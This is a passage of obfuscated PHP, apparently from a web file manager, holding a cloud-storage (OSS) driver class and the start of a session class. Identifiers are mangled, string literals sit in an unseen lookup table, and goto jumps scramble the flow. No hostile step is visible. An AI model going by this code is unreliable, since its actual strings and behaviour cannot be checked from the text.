$¬ÃÄÙ’[214], $¬ÃÄÙ’[76] => isset($ÎÚ‹Ş«Ô[$¬ÃÄÙ’[76]]) ? $ÎÚ‹Ş«Ô[$¬ÃÄÙ’[76]] : 0, $¬ÃÄÙ’[175] => $this->ext($œŒ‰®ù¾)); if ($õÀÅ•›È) { return $´´›Øù; } $´´›Øù[$¬ÃÄÙ’[215]] = $´´›Øù[$¬ÃÄÙ’[85]] = 0; $´´›Øù[$¬ÃÄÙ’[216]] = $´´›Øù[$¬ÃÄÙ’[217]] = !0; if (empty($ÎÚ‹Ş«Ô)) { $¡ƒˆü« = $this->objectMeta($œŒ‰®ù¾); if (!$¡ƒˆü«) { return $´´›Øù; } $ÎÚ‹Ş«Ô = array($¬ÃÄÙ’[85] => strtotime($¡ƒˆü«[$¬ÃÄÙ’[1437]]), $¬ÃÄÙ’[76] => $¡ƒˆü«[$¬ÃÄÙ’[1436]] + 0, $¬ÃÄÙ’[1435] => $¡ƒˆü«[$¬ÃÄÙ’[1435]]); } if (isset($ÎÚ‹Ş«Ô[$¬ÃÄÙ’[1435]]) && $ÎÚ‹Ş«Ô[$¬ÃÄÙ’[1435]]) { $´´›Øù[$¬ÃÄÙ’[219]] = trim($ÎÚ‹Ş«Ô[$¬ÃÄÙ’[1435]], $¬ÃÄÙ’[118]); } if (isset($ÎÚ‹Ş«Ô[$¬ÃÄÙ’[76]])) { $´´›Øù[$¬ÃÄÙ’[76]] = $ÎÚ‹Ş«Ô[$¬ÃÄÙ’[76]]; } if (isset($ÎÚ‹Ş«Ô[$¬ÃÄÙ’[85]])) { $´´›Øù[$¬ÃÄÙ’[85]] = $ÎÚ‹Ş«Ô[$¬ÃÄÙ’[85]]; } if (isset($ÎÚ‹Ş«Ô[$¬ÃÄÙ’[194]]) && !trim($´´›Øù[$¬ÃÄÙ’[85]])) { $´´›Øù[$¬ÃÄÙ’[85]] = $ÎÚ‹Ş«Ô[$¬ÃÄÙ’[194]]; } return $´´›Øù; } private function folderInfo($Öşì°Ë’, $‘õªşß» = false, $ãÏÇ´»Æ = array()) { $ÃÄë£à =& $_SERVER[çâ¥×ø³]; $ßÒÇ”¯ = array($ÃÄë£à[32] => $this->pathThis($Öşì°Ë’), $ÃÄë£à[84] => $this->getPathOuter($ÃÄë£à[8] . $Öşì°Ë’), $ÃÄë£à[33] => $ÃÄë£à[75]); if ($‘õªşß») { return $ßÒÇ”¯; } $ßÒÇ”¯[$ÃÄë£à[215]] = $ßÒÇ”¯[$ÃÄë£à[85]] = 0; $ßÒÇ”¯[$ÃÄë£à[216]] = $ßÒÇ”¯[$ÃÄë£à[217]] = !0; if (empty($ãÏÇ´»Æ)) { $Öşì°Ë’ = rtrim($Öşì°Ë’, $ÃÄë£à[8]) . $ÃÄë£à[8]; $µ¾¯öùØ = $this->objectMeta($Öşì°Ë’); if (!$µ¾¯öùØ) { return $ßÒÇ”¯; } $ãÏÇ´»Æ = array($ÃÄë£à[215] => $µ¾¯öùØ[$ÃÄë£à[544]][$ÃÄë£à[1444]], $ÃÄë£à[85] => strtotime($µ¾¯öùØ[$ÃÄë£à[1437]])); } if (isset($ãÏÇ´»Æ[$ÃÄë£à[85]])) { $ßÒÇ”¯[$ÃÄë£à[85]] = $ãÏÇ´»Æ[$ÃÄë£à[85]]; } if (isset($ãÏÇ´»Æ[$ÃÄë£à[215]])) { $ßÒÇ”¯[$ÃÄë£à[215]] = $ãÏÇ´»Æ[$ÃÄë£à[215]]; } return $ßÒÇ”¯; } public function listPath($¤Ñó ¯¨, $Ç‘Šâø = false) { $Šİµ°ƒì =& $_SERVER[çâ¥×ø³]; $Ô–‹ÒÀ© = $this->fileList($¤Ñó ¯¨, $Šİµ°ƒì[8], !0); foreach ($Ô–‹ÒÀ©[$Šİµ°ƒì[82]] as $¸ŸŠË„ => $³á¤Êâ) { $Ô–‹ÒÀ©[$Šİµ°ƒì[82]][$¸ŸŠË„] = $this->folderInfo($³á¤Êâ, $Ç‘Šâø, $³á¤Êâ); } foreach ($Ô–‹ÒÀ©[$Šİµ°ƒì[83]] as $¸ŸŠË„ => $³á¤Êâ) { $Ô–‹ÒÀ©[$Šİµ°ƒì[83]][$¸ŸŠË„] = $this->fileInfo($³á¤Êâ[$Šİµ°ƒì[32]], $Ç‘Šâø, $³á¤Êâ); } return $Ô–‹ÒÀ©; } protected function infoChildren($š˜•·¬¬, &$Ç¹ñİñ”) { $ˆ×À÷—Â =& $_SERVER[çâ¥×ø³]; $·¶âù‘ = $this->fileList($š˜•·¬¬, $ˆ×À÷—Â[12], !0); $Ç¹ñİñ”[$ˆ×À÷—Â[78]] += count($·¶âù‘[$ˆ×À÷—Â[82]]); $Ç¹ñİñ”[$ˆ×À÷—Â[77]] += count($·¶âù‘[$ˆ×À÷—Â[83]]); foreach ($·¶âù‘[$ˆ×À÷—Â[83]] as $ó»‚å„¯) { if (!$ó»‚å„¯ || !$ó»‚å„¯[$ˆ×À÷—Â[76]]) { continue; } $Ç¹ñİñ”[$ˆ×À÷—Â[76]] += $ó»‚å„¯[$ˆ×À÷—Â[76]]; } } public function has($ò–È€±õ, $˜á¶ò•’ = false, $É¶ú×Ş = true) { $…É• ¶‡ =& $_SERVER[çâ¥×ø³]; $ò–È€±õ = trim($ò–È€±õ, $…É• ¶‡[8]); $ÒÉ¤¿“ = empty($ò–È€±õ) && $ò–È€±õ !== $…É• ¶‡[212] ? $…É• ¶‡[12] : $ò–È€±õ . $…É• ¶‡[8]; $ÉÉˆÑÏÙ = $…É• ¶‡[12]; $âÁ¹ÄÇ¿ = 500; $Ì•ûŠë‹ = $ØâÑÕÒÌ = 0; while (!0) { check_abort(); $öšç´½‚ = array($…É• ¶‡[1431] => $…É• ¶‡[8], $…É• ¶‡[1432] => $ÒÉ¤¿“, $…É• ¶‡[1433] => $âÁ¹ÄÇ¿, $…É• ¶‡[1434] => $ÉÉˆÑÏÙ); try { $ã÷ãêù· = $this->client->listObjects($this->bucket, $öšç´½‚); } catch (OSS\Core\OssException $Îî‹íÏÆ) { break; } $ÉÉˆÑÏÙ = $ã÷ãêù·->getNextMarker(); $×²–úÇ = $ã÷ãêù·->getObjectList(); $†ãÈŸİ = $ã÷ãêù·->getPrefixList(); if ($˜á¶ò•’) { if (count($×²–úÇ) > 1 || count($×²–úÇ) == 1 && $×²–úÇ[0]->getKey() != $ÒÉ¤¿“) { $Ì•ûŠë‹ += count($×²–úÇ) - 1; } if (!empty($†ãÈŸİ)) { $ØâÑÕÒÌ += count($†ãÈŸİ); } if ($ÉÉˆÑÏÙ === $…É• ¶‡[12]) { break; } continue; } if ($É¶ú×Ş) { if (!empty($×²–úÇ)) { if (count($×²–úÇ) > 1 || $×²–úÇ[0]->getKey() != $ÒÉ¤¿“) { return !0; } } } else { if (!empty($†ãÈŸİ)) { return !0; } } if ($ÉÉˆÑÏÙ === $…É• ¶‡[12]) { break; } } if ($˜á¶ò•’) { return array($…É• ¶‡[223] => $Ì•ûŠë‹, $…É• ¶‡[224] => $ØâÑÕÒÌ); } return !1; } public function listAll($ÛİßÈ¥å) { $‡ÙÌµÑ =& $_SERVER[çâ¥×ø³]; $Æ«ÕÏÜŞ = $this->fileList($ÛİßÈ¥å, $‡ÙÌµÑ[12], !0); $‡¨ıÖú­ = array_to_keyvalue($Æ«ÕÏÜŞ[$‡ÙÌµÑ[83]], $‡ÙÌµÑ[32]); foreach ($Æ«ÕÏÜŞ[$‡ÙÌµÑ[82]] as $”ÛÇ¼ê©) { if (is_string($”ÛÇ¼ê©)) { $‡¨ıÖú­[$”ÛÇ¼ê©] = array($‡ÙÌµÑ[76] => 0); } } return $this->listAllFiles($ÛİßÈ¥å, $‡¨ıÖú­); } public function canRead($ÏØûñ‰) { $ˆ’Èç’É =& $_SERVER[çâ¥×ø³]; $ı«ü›Ú = $this->pathAcl($ÏØûñ‰); return $ı«ü›Ú == $ˆ’Èç’É[1445] || $ı«ü›Ú == $ˆ’Èç’É[587] ? !0 : !1; } public function canWrite($¤ºÅÔÇ™) { $ŞÜ¨ëŠ = $this->pathAcl($¤ºÅÔÇ™); return $ŞÜ¨ëŠ == $_SERVER[çâ¥×ø³][587] ? !0 : !1; } public function pathAcl($Æ…ÕÃ“¼) { $íª·Õ©¿ =& $_SERVER[çâ¥×ø³]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ôÅ°¾³ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Æ…ÕÃ“¼)); } catch (OSS\Core\OssException $¢ã´²–²) { return !1; } $ÆÅ¾êÍ® = $ôÅ°¾³ == $íª·Õ©¿[37] ? $this->bucketAcl : $ôÅ°¾³; if ($ÆÅ¾êÍ® == $íª·Õ©¿[1446]) { return $íª·Õ©¿[1445]; } if ($ÆÅ¾êÍ® == $íª·Õ©¿[1447]) { return $íª·Õ©¿[587]; } return $ÆÅ¾êÍ®; } private function chmodPath($•Í°ùÄú, $Şîƒ— = '') { $±Ûú”†ò =& $_SERVER[çâ¥×ø³]; $‚ĞÕ½ßä = empty($Şîƒ—) ? $±Ûú”†ò[1447] : $Şîƒ—; $÷Ïç¾é³ = array($±Ûú”†ò[37], $±Ûú”†ò[213], $±Ûú”†ò[1446], $±Ûú”†ò[1447]); if (!in_array($‚ĞÕ½ßä, $÷Ïç¾é³)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($•Í°ùÄú), $‚ĞÕ½ßä); } catch (OSS\Core\OssException $á»Çäıı) { return !1; } return !0; } public function getContent($œÆ¾éó‡) { return $this->fileSubstr($œÆ¾éó‡, -1); } public function setContent($¥âª¹Ê, $›Ú­€‡Û = '') { $âğÍøù§ =& $_SERVER[çâ¥×ø³]; try { $§Å€¨ıÁ = $this->trafficLimit($âğÍøù§[1448]); $ÁæØÊæ = $this->client->putObject($this->bucket, $this->pathEncode($¥âª¹Ê), $›Ú­€‡Û, $§Å€¨ıÁ); } catch (OSS\Core\OssException $í®åü·¶) { return !1; } $–·£“ß² = array($âğÍøù§[1438] => trim($ÁæØÊæ[$âğÍøù§[1435]], $âğÍøù§[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¥âª¹Ê))); $this->updateObjMeta($¥âª¹Ê, $–·£“ß²); return isset($ÁæØÊæ[$âğÍøù§[1449]][$âğÍøù§[275]]) ? !0 : !1; } private function updateObjMeta($·„•³Î€, $…íåïÄà) { $·„•³Î€ = $this->pathEncode($·„•³Î€); try { $²¶ÓñÑ = array(OSS\OssClient::OSS_HEADERS => $…íåïÄà); $this->client->copyObject($this->bucket, $·„•³Î€, $this->bucket, $·„•³Î€, $²¶ÓñÑ); } catch (OSS\Core\OssException $êù¸Å¡½) { return !1; } return !0; } public function upload($–ê”ÚÄ®, $‚€£ÒîÌ, $½Ô‚Ë½ = false, $í¿ˆà‘‚ = REPEAT_REPLACE) { $¹Í§ÂÓü =& $_SERVER[çâ¥×ø³]; $‰ ø÷±À = trim($–ê”ÚÄ®, $¹Í§ÂÓü[8]); $´Ğ÷¬‘ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¹Í§ÂÓü[1438] => @md5_file($‚€£ÒîÌ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($–ê”ÚÄ®))); $´Ğ÷¬‘ = $this->trafficLimit($¹Í§ÂÓü[1448], $´Ğ÷¬‘); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‰ ø÷±À), $‚€£ÒîÌ, $´Ğ÷¬‘); } catch (OSS\Core\OssException $ŠÈÌÖ‹Ø) { return !1; } return $this->getPathOuter($–ê”ÚÄ®); } public function getHost() { $´ûˆ¨»„ =& $_SERVER[çâ¥×ø³]; $›“€š‡Å = explode($´ûˆ¨»„[198], parent::getHost()); return $›“€š‡Å[0] . $´ûˆ¨»„[198] . $this->bucket . $´ûˆ¨»„[10] . $›“€š‡Å[1]; } public function uploadFormData($ûöˆé, $ü¹Èü§÷ = 3600) { $ÅÄø¡ =& $_SERVER[çâ¥×ø³]; if (!($ÔıÑ©ÓÕ = $this->getHost())) { return !1; } $éÏÎ‹şü = $ü¹Èü§÷; $ı‹ÜÅûØ = date($ÅÄø¡[1450], time() + $éÏÎ‹şü); $ÇØÚ”˜ = new DateTime($ı‹ÜÅûØ); $áöªÊ´¦ = $ÇØÚ”˜->format(DateTime::ISO8601); $µÇç¶é¼ = strpos($áöªÊ´¦, $ÅÄø¡[340]); $áöªÊ´¦ = substr($áöªÊ´¦, 0, $µÇç¶é¼) . $ÅÄø¡[1451]; $²”ö®ïì = 1048576000 * 5; $ƒï©ùƒ = $this->pathFather($ûöˆé); $ŒÒ¨ŠøŒ = array($ÅÄø¡[258] => $áöªÊ´¦, $ÅÄø¡[261] => array(array($ÅÄø¡[1452], 0, $²”ö®ïì), array($ÅÄø¡[264], $ÅÄø¡[265], $ƒï©ùƒ))); $´ËéÕ”Ş = base64_encode(json_encode($ŒÒ¨ŠøŒ)); $Â¡ôåŒÅ = base64_encode(hash_hmac($ÅÄø¡[247], $´ËéÕ”Ş, $this->secret, !0)); $ï ë‰ÚÚ = array($ÅÄø¡[276] => $´ËéÕ”Ş, $ÅÄø¡[1453] => $this->accessKey, $ÅÄø¡[268] => $ÅÄø¡[257], $ÅÄø¡[1454] => $Â¡ôåŒÅ, $ÅÄø¡[196] => $ÔıÑ©ÓÕ); $ï ë‰ÚÚ = $this->trafficLimit($ÅÄø¡[1448], $ï ë‰ÚÚ); return $ï ë‰ÚÚ; } public function multiUploadFormData($Ññî»¤ç, $©Ÿ»±ÎÙ = 3600) { $òÔş¬’Ô =& $_SERVER[çâ¥×ø³]; if (!($æû‡å˜ = $this->getHost())) { return !1; } $Á»¥¯¶Ğ = $this->trafficLimit($òÔş¬’Ô[1448]); $ÇÀ¾Ì“È = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ññî»¤ç), $Á»¥¯¶Ğ); return array($òÔş¬’Ô[238] => $ÇÀ¾Ì“È, $òÔş¬’Ô[196] => $æû‡å˜ . $òÔş¬’Ô[8] . $this->pathEncode($Ññî»¤ç), $òÔş¬’Ô[239] => gmdate($òÔş¬’Ô[1455]), $òÔş¬’Ô[94] => $Ññî»¤ç); } public function multiUploadAuthData($â¬§©Ôõ, $ì‰Ó÷¶ = array()) { $é¥Ï‰¬ü =& $_SERVER[çâ¥×ø³]; $‰¡ã†˜ = isset($ì‰Ó÷¶[$é¥Ï‰¬ü[239]]) ? $ì‰Ó÷¶[$é¥Ï‰¬ü[239]] : gmdate($é¥Ï‰¬ü[1455]); $˜¿Ü¥´ü = isset($ì‰Ó÷¶[$é¥Ï‰¬ü[175]]) ? $ì‰Ó÷¶[$é¥Ï‰¬ü[175]] : $é¥Ï‰¬ü[12]; $¨§É£¾à = $â¬§©Ôõ; if (isset($ì‰Ó÷¶[$é¥Ï‰¬ü[94]])) { $¨§É£¾à = $ì‰Ó÷¶[$é¥Ï‰¬ü[94]]; unset($ì‰Ó÷¶[$é¥Ï‰¬ü[94]]); } if (isset($ì‰Ó÷¶[$é¥Ï‰¬ü[240]])) { $ì‰Ó÷¶[$é¥Ï‰¬ü[239]] = $‰¡ã†˜; return $this->listUploadParts($¨§É£¾à, $ì‰Ó÷¶); } $Ì©¥Õò¸ = array($é¥Ï‰¬ü[241], $é¥Ï‰¬ü[12], $é¥Ï‰¬ü[120], $‰¡ã†˜, "\x78\x2d\x6f\x73\163\x2d\144\x61\x74\145\x3a{$‰¡ã†˜}", $é¥Ï‰¬ü[8] . $this->bucket . $é¥Ï‰¬ü[8] . $¨§É£¾à . $˜¿Ü¥´ü); if (strpos($˜¿Ü¥´ü, $é¥Ï‰¬ü[242]) === 0) { $Ì©¥Õò¸[0] = $é¥Ï‰¬ü[243]; if ($ŒÙ¾Ä…± = $this->trafficLimit($é¥Ï‰¬ü[1448])) { $¨§É£¾à = $é¥Ï‰¬ü[1456]; array_splice($Ì©¥Õò¸, 5, 0, $¨§É£¾à . $é¥Ï‰¬ü[4] . $ŒÙ¾Ä…±[$¨§É£¾à]); } } if (isset($ì‰Ó÷¶[$é¥Ï‰¬ü[244]]) && $ì‰Ó÷¶[$é¥Ï‰¬ü[244]] == $é¥Ï‰¬ü[245]) { $Ì©¥Õò¸[0] = $é¥Ï‰¬ü[245]; } if (!empty($ì‰Ó÷¶[$é¥Ï‰¬ü[1457]])) { $©•ºíã = array_merge(array($Ì©¥Õò¸[4]), $ì‰Ó÷¶[$é¥Ï‰¬ü[1457]]); sort($©•ºíã); $Ì©¥Õò¸[4] = implode($é¥Ï‰¬ü[246], $©•ºíã); } $×”Ù»¹ = implode($é¥Ï‰¬ü[246], $Ì©¥Õò¸); $»œóÂä´ = base64_encode(hash_hmac($é¥Ï‰¬ü[247], $×”Ù»¹, $this->secret, !0)); $°ë‘¦¤† = $é¥Ï‰¬ü[1421] . $this->accessKey . $é¥Ï‰¬ü[4] . $»œóÂä´; if (strpos($˜¿Ü¥´ü, $é¥Ï‰¬ü[242]) === 0) { $°ë‘¦¤† = array($é¥Ï‰¬ü[249] => $°ë‘¦¤†, $é¥Ï‰¬ü[239] => $‰¡ã†˜); if ($ŒÙ¾Ä…±) { $°ë‘¦¤† = array_merge($°ë‘¦¤†, $ŒÙ¾Ä…±); } } return $°ë‘¦¤†; } public function listUploadParts($˜¤¼”ø¼, $Îıî¥üß) { $‰ƒü“Õ÷ =& $_SERVER[çâ¥×ø³]; $Æà£Í…ğ = parse_url_query($Îıî¥üß[$‰ƒü“Õ÷[175]]); $­¥ÈÄ = $this->client->listParts($this->bucket, $this->pathEncode($˜¤¼”ø¼), $Æà£Í…ğ[$‰ƒü“Õ÷[238]]); $¸›é„éÏ = $­¥ÈÄ->getListPart(); $¦ÒóìÂÖ = array(); foreach ($¸›é„éÏ as $Â¦æÒóĞ) { $¦ÒóìÂÖ[] = array($‰ƒü“Õ÷[1442] => $Â¦æÒóĞ->getPartNumber(), $‰ƒü“Õ÷[1443] => trim($Â¦æÒóĞ->getETag(), $‰ƒü“Õ÷[118])); } unset($Îıî¥üß[$‰ƒü“Õ÷[240]], $Îıî¥üß[$‰ƒü“Õ÷[244]]); $™æ ¾Á‰ = $this->multiUploadAuthData($˜¤¼”ø¼, $Îıî¥üß); if (empty($™æ ¾Á‰)) { return !1; } return array($‰ƒü“Õ÷[249] => $™æ ¾Á‰, $‰ƒü“Õ÷[239] => $Îıî¥üß[$‰ƒü“Õ÷[239]], $‰ƒü“Õ÷[251] => $¦ÒóìÂÖ); } public function download($æÎ­ş , $Â™¿ëÅÇ) { if ($this->isFolder($æÎ­ş )) { return !1; } try { $É–ç—û = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Â™¿ëÅÇ); $É–ç—û = $this->trafficLimit($_SERVER[çâ¥×ø³][109], $É–ç—û); $this->client->getObject($this->bucket, $this->pathEncode($æÎ­ş ), $É–ç—û); } catch (OSS\Core\OssException $Ó¸µ¯‡ï) { return !1; } return $Â™¿ëÅÇ; } public function fileSubstr($Úì‹Ëé¥, $â³Ë×“Ó = 0, $Õö™İƒª = false) { if ($â³Ë×“Ó === -1) { $Ø™·™Õš = array(); } else { if ($Õö™İƒª === !1) { $óÃ•£ã¹ = $this->size($Úì‹Ëé¥); } else { $óÃ•£ã¹ = $â³Ë×“Ó + $Õö™İƒª - 1; } $Ø™·™Õš = array(OSS\OssClient::OSS_RANGE => "{$â³Ë×“Ó}\55{$óÃ•£ã¹}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Úì‹Ëé¥), $Ø™·™Õš); } catch (OSS\Core\OssException $ ¥ê¹Ù‘) { think_exception($ ¥ê¹Ù‘->getMessage()); return !1; } } private function trafficLimit($Çˆ°½ÑØ, $âËğ´“€ = array()) { $‹ÙèéÚ‡ =& $_SERVER[çâ¥×ø³]; if ($Çˆ°½ÑØ == $‹ÙèéÚ‡[1448] && $this->isUploadServer() || $Çˆ°½ÑØ == $‹ÙèéÚ‡[109] && $this->isFileOutServer()) { return $âËğ´“€; } $¹Û¨óÎæ = floatval($GLOBALS[$‹ÙèéÚ‡[6]][$‹ÙèéÚ‡[89]][$‹ÙèéÚ‡[107]][$Çˆ°½ÑØ]) * 1024 * 1024 * 8; if (!$¹Û¨óÎæ) { return $âËğ´“€; } $¹Û¨óÎæ = $¹Û¨óÎæ < 819200 ? 819200 : ($¹Û¨óÎæ > 838860800 ? 838860800 : $¹Û¨óÎæ); $âËğ´“€[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¹Û¨óÎæ); return $âËğ´“€; } public function link($ÉñÜ¢£, $‰¯­×œú = array()) { $’èş¢ =& $_SERVER[çâ¥×ø³]; if (!$this->exist($ÉñÜ¢£) || $this->isFolder($ÉñÜ¢£)) { return !1; } try { $‰¯­×œú = $this->trafficLimit($’èş¢[109], $‰¯­×œú); $æâñÈïÜ = $this->client->signUrl($this->bucket, $this->pathEncode($ÉñÜ¢£), 3600 * 12, $’èş¢[245], $‰¯­×œú); return $this->getCdnLink($æâñÈïÜ); } catch (OSS\Core\OssException $„Ø²–÷¸) { return !1; } } public function fileOut($Ï¨ÉÒ–, $ğèÕÎÄå = false, $³ñ£ƒÄÀ = false, $¥ëåó†¸ = '') { $ù´´‹öñ =& $_SERVER[çâ¥×ø³]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ï¨ÉÒ–, $ğèÕÎÄå, $³ñ£ƒÄÀ, $¥ëåó†¸); } if (!$³ñ£ƒÄÀ) { $³ñ£ƒÄÀ = $this->pathThis($Ï¨ÉÒ–); } $³ñ£ƒÄÀ = rawurlencode($³ñ£ƒÄÀ); $Ëü»‚ = get_file_mime(get_path_ext($³ñ£ƒÄÀ)); if ($Ëü»‚ == $ù´´‹öñ[232]) { return parent::fileOut($Ï¨ÉÒ–, $ğèÕÎÄå, $³ñ£ƒÄÀ, $¥ëåó†¸); } $ğèÕÎÄå = $ğèÕÎÄå ? $ù´´‹öñ[1458] : $ù´´‹öñ[1459]; $–´“ä = array(OSS\OssClient::OSS_SUB_RESOURCE => $ù´´‹öñ[1460] . rawurlencode("{$ğèÕÎÄå}\x3b\146\x69\x6c\x65\156\x61\x6d\x65\75{$³ñ£ƒÄÀ}")); $–´“ä[OSS\OssClient::OSS_SUB_RESOURCE] .= $ù´´‹öñ[1461] . rawurlencode($Ëü»‚); $ ñÄ¦“ß = $this->link($Ï¨ÉÒ–, $–´“ä); $this->fileOutLink($ ñÄ¦“ß); } public function fileOutServer($–è£Æü¯, $»¦û† = false, $ÀÇ»Òˆí = false, $ë¢·Åèî = '') { parent::fileOut($–è£Æü¯, $»¦û†, $ÀÇ»Òˆí, $ë¢·Åèî); } public function fileOutImage($Ùó¾ÕØº, $ø˜Úõàá = 250) { if ($this->size($Ùó¾ÕØº) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ùó¾ÕØº, $ø˜Úõàá); } $Í…Ù†¹Û = array(OSS\OssClient::OSS_PROCESS => $_SERVER[çâ¥×ø³][1462] . $ø˜Úõàá); $‘©®œ…¹ = $this->link($Ùó¾ÕØº, $Í…Ù†¹Û); $this->fileOutLink($‘©®œ…¹); } public function fileOutImageServer($¸ÒÓö», $¿ŸÊê®‚ = 250) { parent::fileOutImage($¸ÒÓö», $¿ŸÊê®‚); } public function fileOutLink($çÃ“§‡Õ) { $•ú¤õÃé =& $_SERVER[çâ¥×ø³]; if (!$this->isCdnHost() && substr($çÃ“§‡Õ, 0, 7) == $•ú¤õÃé[1383]) { $çÃ“§‡Õ = $•ú¤õÃé[1384] . substr($çÃ“§‡Õ, 7); } header($•ú¤õÃé[162] . $çÃ“§‡Õ); die; } public function hashMd5($¦µÆÁí, $ıĞåæû¯ = '') { $—ªÎâŠı =& $_SERVER[çâ¥×ø³]; $ÙÅŒÌ±Ó = $this->_objectMeta($¦µÆÁí); if (!$ÙÅŒÌ±Ó) { return $—ªÎâŠı[12]; } if (!isset($ÙÅŒÌ±Ó[$—ªÎâŠı[1438]]) && !empty($ıĞåæû¯)) { $‚´è±œ = $this->updateObjMeta($¦µÆÁí, array($—ªÎâŠı[1438] => $ıĞåæû¯)); $ÙÅŒÌ±Ó[$—ªÎâŠı[1438]] = $‚´è±œ ? $ıĞåæû¯ : $—ªÎâŠı[12]; } return isset($ÙÅŒÌ±Ó[$—ªÎâŠı[1438]]) ? strtolower($ÙÅŒÌ±Ó[$—ªÎâŠı[1438]]) : $—ªÎâŠı[12]; } public function size($ï‡úñ„«) { $˜§İØÍ = $this->objectMeta($ï‡úñ„«); return $˜§İØÍ ? $˜§İØÍ[$_SERVER[çâ¥×ø³][76]] : 0; } public function info($¹Ê¾šŸà) { if ($this->isFolder($¹Ê¾šŸà)) { return $this->folderInfo($¹Ê¾šŸà); } else { if ($this->isFile($¹Ê¾šŸà)) { return $this->fileInfo($¹Ê¾šŸà); } } return !1; } public function exist($êåÀ©áç) { return $this->isFile($êåÀ©áç) || $this->isFolder($êåÀ©áç); } public function isFile($êÌŸ²¸·) { return !$this->isFolder($êÌŸ²¸·) && $this->objectMeta($êÌŸ²¸·); } public function isFolder($íã­¦) { return $this->cacheMethod($_SERVER[çâ¥×ø³][166], $íã­¦); } protected function objectMeta($‡°ÌÄÇÌ) { return $this->cacheMethod($_SERVER[çâ¥×ø³][168], $‡°ÌÄÇÌ); } protected function _objectMeta($ÄÛÍÓËŒ) { $Ûİì¶·Ü =& $_SERVER[çâ¥×ø³]; try { $‘öîÈ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÄÛÍÓËŒ)); } catch (OSS\Core\OssException $Æå‰åê ) { $‘öîÈ = !1; } if ($‘öîÈ) { $‘öîÈ[$Ûİì¶·Ü[76]] = intval($‘öîÈ[$Ûİì¶·Ü[1436]]); } return $‘öîÈ; } protected function _isFolder($İ­Äış) { $Ã¥¦œÎ =& $_SERVER[çâ¥×ø³]; if ($İ­Äış == $Ã¥¦œÎ[12] || $İ­Äış == $Ã¥¦œÎ[8]) { return !0; } $“‰Ğ¬û = array($Ã¥¦œÎ[1431] => $Ã¥¦œÎ[8], $Ã¥¦œÎ[1432] => rtrim($İ­Äış, $Ã¥¦œÎ[8]) . $Ã¥¦œÎ[8], $Ã¥¦œÎ[1433] => 1, $Ã¥¦œÎ[1434] => $Ã¥¦œÎ[12]); $åô¾Õ’Ş = $this->client->listObjects($this->bucket, $“‰Ğ¬û); if ($åô¾Õ’Ş->getObjectList() || $åô¾Õ’Ş->getPrefixList()) { return !0; } return !1; } } goto F¢’¦Ì§‘Ü; EÜ…­ùîÛé: define($_SERVER[çâ¥×ø³][282], 1); define($_SERVER[çâ¥×ø³][283], 2); define($_SERVER[çâ¥×ø³][284], 3); goto DË¢ œĞË; FÖÒ¼¸¨Ÿ•: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $“‘ôš¼¸ =& $_SERVER[çâ¥×ø³]; static $•ÛŠ©Á– = false; if ($•ÛŠ©Á–) { return $•ÛŠ©Á–; } $ƒ™¹«¦¯ = $GLOBALS[$“‘ôš¼¸[6]][$“‘ôš¼¸[393]]; self::$sessionTime = $ƒ™¹«¦¯[$“‘ôš¼¸[1653]]; $©ø¹Û×é = isset($GLOBALS[$“‘ôš¼¸[1654]]) ? $GLOBALS[$“‘ôš¼¸[1654]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($©ø¹Û×é)) { self::$sessionSign = Cookie::get($©ø¹Û×é); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($©ø¹Û×é, self::$sessionSign, self::$sessionTime); $õÃŸÙøó = $ƒ™¹«¦¯[$“‘ôš¼¸[1655]]; $¬ƒ›¢´ = $ƒ™¹«¦¯[$õÃŸÙøó]; $¤´Ì«†œ = $ƒ™¹«¦¯[$“‘ôš¼¸[877]]; switch ($õÃŸÙøó) { case $“‘ôš¼¸[21]: self::$handle = Model($“‘ôš¼¸[878]); break; case $“‘ôš¼¸[879]: self::$handle = new CacheRedis($¬ƒ›¢´, $¤´Ì«†œ); break; case $“‘ôš¼¸[880]: self::$handle = new CacheMemcached($¬ƒ›¢´, $¤´Ì«†œ); break; case $“‘ôš¼¸[214]: $¬ƒ›¢´[$“‘ôš¼¸[84]] = $¬ƒ›¢´[$“‘ôš¼¸[84]] . $“‘ôš¼¸[1656]; self::$handle = new CacheFile($¬ƒ›¢´, $¤´Ì«†œ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $•ÛŠ©Á– = new self(); return $•ÛŠ©Á–; } public static function getBySign($Å ËãâÓ) { $ÉÄåé = self::$handle->get($Å ËãâÓ); $ÉÄåé = unserialize($ÉÄåé); return is_array($ÉÄåé) ? $ÉÄåé : array(); } public static function setBySign($‘óˆÒâ, $¢êı†Œ¾) { CacheLock::lock($‘óˆÒâ); self::$handle->set($‘óˆÒâ, serialize($¢êı†Œ¾), self::$sessionTime); CacheLock::unlock($‘óˆÒâ); } public static function sign($ùŒ»›ª = false) { if ($ùŒ»›ª) { self::$sessionSign = $ùŒ»›ª; } self::init(); return self::$sessionSign; } public static function set($‹ó·Í…, $ô¾çØè÷ = false) { self::init(); if (is_array($‹ó·Í…)) { foreach ($‹ó·Í… as $«ÊÀõ·— => $¿³ô¨) { array_set_value(self::$data, $«ÊÀõ·—, $¿³ô¨); } } else { array_set_value(self::$data, $‹ó·Í…, $ô¾çØè÷); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ïõ´Ëò‡ = false) { self::init(); if (!$ïõ´Ëò‡) { return self::$data; } return array_get_value(self::$data, $ïõ´Ëò‡); } public static function 